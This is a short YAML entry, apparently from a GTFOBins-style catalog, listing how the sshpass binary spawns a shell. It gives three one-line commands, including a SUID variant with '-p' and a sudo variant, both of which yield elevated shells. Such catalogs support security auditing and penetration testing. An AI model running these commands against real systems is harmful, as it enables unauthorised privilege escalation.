---
functions:
  shell:
    - code: sshpass /bin/sh
  suid:
    - code: ./sshpass /bin/sh -p
  sudo:
    - code: sudo sshpass /bin/sh
---
